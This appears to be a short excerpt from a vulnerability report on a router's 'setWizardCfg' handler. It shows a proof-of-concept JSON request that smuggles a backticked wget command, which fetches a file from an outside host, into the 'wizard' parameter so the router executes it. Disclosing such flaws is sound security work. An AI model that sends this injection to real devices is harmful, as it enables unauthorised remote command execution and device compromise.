...
In sub_425428 function, it reads in a user-provided parameter `wizard` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `wizard` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setWizardCfg","wizard":"`wget 192.168.6.1:7777/testpoc`"
}
```
